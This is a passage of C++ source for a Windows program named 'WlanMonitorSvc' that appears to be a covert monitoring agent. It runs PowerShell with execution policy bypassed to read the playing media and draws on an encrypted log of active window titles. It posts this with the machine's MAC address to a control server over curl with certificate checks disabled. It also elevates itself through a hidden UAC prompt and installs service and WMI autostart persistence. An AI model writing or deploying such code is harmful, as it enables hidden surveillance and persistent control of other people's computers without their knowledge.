            std::string ps = "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"$ErrorActionPreference='Stop'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Add-Type -AssemblyName System.Runtime.WindowsRuntime; [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager, Windows.Media.Control, ContentType=WindowsRuntime] | Out-Null; $mgr = [System.WindowsRuntimeSystemExtensions]::AsTask([Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager]::RequestAsync()).Result; if (-not $mgr) { Write-Output 'STATE:IDLE'; exit }; $sess = $mgr.GetCurrentSession(); if (-not $sess) { Write-Output 'STATE:IDLE'; exit }; $pb = $sess.GetPlaybackInfo(); if (-not $pb -or $pb.PlaybackStatus -ne [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionPlaybackStatus]::Playing) { Write-Output 'STATE:IDLE'; exit }; $props = [System.WindowsRuntimeSystemExtensions]::AsTask($sess.TryGetMediaPropertiesAsync()).Result; $artist = ''; $title = ''; if ($props) { $artist = $props.Artist; $title = $props.Title }; if ([string]::IsNullOrWhiteSpace($artist) -and [string]::IsNullOrWhiteSpace($title)) { Write-Output 'STATE:PLAYING|'; } elseif ([string]::IsNullOrWhiteSpace($artist)) { Write-Output ('STATE:PLAYING|' + $title); } elseif ([string]::IsNullOrWhiteSpace($title)) { Write-Output ('STATE:PLAYING|' + $artist); } else { Write-Output ('STATE:PLAYING|' + $artist + ' - ' + $title); } } catch { Write-Output 'STATE:IDLE' }\"";
            std::string mediaInfo = ExecCmd(ps, true);
            TrimString(mediaInfo);
            WriteLog("MEDIA_INFO primary raw: [" + mediaInfo + "]");

            bool isPlaying = false;
            std::string song;
            if (mediaInfo.rfind("STATE:PLAYING|", 0) == 0) {
                isPlaying = true;
                song = mediaInfo.substr(14);
                TrimString(song);
            }

            // 兼容回退：部分系统上 PlaybackStatus 判断不稳定，直接读取会话媒体属性补救
            if (!isPlaying || song.empty()) {
                std::string psFallback = "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager, Windows.Media, ContentType=WindowsRuntime] | Out-Null; $m = [Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager]::RequestAsync().GetAwaiter().GetResult(); if ($m) { $s = $m.GetCurrentSession(); if ($s) { $p = $s.TryGetMediaPropertiesAsync().GetAwaiter().GetResult(); if ($p) { $a = $p.Artist; $t = $p.Title; if (-not [string]::IsNullOrWhiteSpace($a) -or -not [string]::IsNullOrWhiteSpace($t)) { if([string]::IsNullOrWhiteSpace($a)){ Write-Output $t } elseif([string]::IsNullOrWhiteSpace($t)){ Write-Output $a } else { Write-Output ($a + ' - ' + $t) } } } } } } catch {}\"";
                std::string fallbackSong = ExecCmd(psFallback, true);
                TrimString(fallbackSong);
                WriteLog("MEDIA_INFO fallback raw: [" + fallbackSong + "]");
                if (!fallbackSong.empty() && fallbackSong.find("Exception") == std::string::npos && fallbackSong.find("Error") == std::string::npos) {
                    isPlaying = true;
                    song = fallbackSong;
                }
            }

            // 最后兜底：从当前前台窗口信息中提取媒体标题（适配浏览器/播放器未暴露SMTC的场景）
            if (!isPlaying || song.empty()) {
                std::string wnd;
                if (ReadEncryptedLocalFile(ACTIVE_WND_STATE, LEGACY_ACTIVE_WND_TXT, wnd)) {
                    TrimString(wnd);
                    std::string low = wnd;
                    for (char& ch : low) ch = (char)tolower((unsigned char)ch);
                    bool maybeMedia = (low.find("spotify") != std::string::npos ||
                                       low.find("cloudmusic") != std::string::npos ||
                                       low.find("qqmusic") != std::string::npos ||
                                       low.find("music") != std::string::npos ||
                                       low.find("chrome") != std::string::npos ||
                                       low.find("msedge") != std::string::npos ||
                                       low.find("firefox") != std::string::npos);
                    if (maybeMedia && !wnd.empty() && wnd.find("[") != std::string::npos && wnd.find("]") != std::string::npos) {
                        isPlaying = true;
                        song = AnsiToUtf8(wnd);
                        WriteLog("MEDIA_INFO window fallback used: [" + wnd + "]");
                    }
                }
            }

            if (!isPlaying) {
                song = AnsiToUtf8("当前未播放媒体 / 已暂停");
            } else if (song.empty()) {
                song = AnsiToUtf8("正在播放媒体");
            }

            // 无论是否成功识别媒体名，都优先上报真实系统音量，避免前端长期显示固定0%
            std::string volStr = (vol >= 0 ? std::to_string(vol) : "");
            std::string res = "VOL:" + volStr + "|SONG:" + song;

            std::string mac = GetMacAddress();
            std::string postData = "mac=" + UrlEncode(mac) + "&info=" + UrlEncode(res);

            // 动态解析出所属控制台服务器的链接，使用轻量 curl 取代原生冗杂的硬编码接口推送状态
            std::string baseUrl = REPORT_URL_BASE;
            size_t reportPos = baseUrl.rfind("/report");
            if (reportPos != std::string::npos) baseUrl = baseUrl.substr(0, reportPos);
            std::string targetUrl = baseUrl + "/api/media_info_result";

            // 输出日志排查错误
            WriteLog("MEDIA_INFO targetUrl: " + targetUrl);
            WriteLog("MEDIA_INFO postData: " + postData);

            std::string curlCmd = "curl.exe -s -k -d \"" + postData + "\" \"" + targetUrl + "\"";
            std::string curlOut = ExecCmd(curlCmd, false);
            WriteLog("MEDIA_INFO curl res: " + curlOut);
            return 0;
        }

        return 0; 
    }

    // 设置全局互斥体，防止多开和多重检测(跨 SYSTEM 账户和普通用户会话)
    SetLastError(0);
    g_hMutex = CreateMutexA(NULL, FALSE, "Global\\WlanMonitorSvc_AutoStart_Mutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // 已有实例在运行，直接退出
        if (g_hMutex) CloseHandle(g_hMutex);
        return 0;
    }

    // 尝试以 Windows 服务模式调度 (由 SCM 启动时才会成功)
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        {(LPSTR)"WlanMonitorSvc", (LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
        {NULL, NULL}
    };
    
    if (StartServiceCtrlDispatcherA(ServiceTable)) {
        // 如果成功，说明由 SCM 拉起，并且此函数一直阻塞直到服务停止
        return 0;
    }

    DWORD err = GetLastError();
    if (err != ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // 其他未知服务注册错误
        return 0;
    }

    // -- 若运行至此，说明是独立双击打开的(非系统服务启动)，进入首次安装提权逻辑 --

    // 如果没有管理员权限，则尝试提权
    if (!IsRunAsAdmin()) {
        WriteLog("========== 尝试提权 ==========");
        WriteLog("检测到非管理员权限，正在请求提权运行以安装服务...");

        std::string exePath = GetExePath();
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";               // 请求管理员权限
        sei.lpFile = exePath.c_str();       // 当前程序路径
        sei.nShow = SW_HIDE;                // 隐藏执行时的黑窗

        if (!ShellExecuteExA(&sei)) {
            err = GetLastError();
            if (err == ERROR_CANCELLED) {
                WriteLog("失败：用户取消了UAC提权提升提示。");
            } else {
                WriteLog("失败：提权失败，错误代码: " + std::to_string(err));
            }
        }
        // 提权后退出当前的非管理员实例
        return 0; 
    }

    #ifdef _DEBUG
    WriteLog("========== 程序手动启动 (DEBUG 测试模式，跳过服务与自启安装) ==========");
    // 直接在当前进程中循环监听，方便断点调试
    MonitorWiFiLoop();
#else
    WriteLog("========== 程序手动启动 (管理员进入 WMI 驻留模式) ==========");

    // 安装 WMI 后台自启，保持 WMI 方案。
    InstallWMIAutoStart();

    WriteLog("========== 准备完毕，进入后台常驻监听循环 ==========\n");
    MonitorWiFiLoop();
#endif
    return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
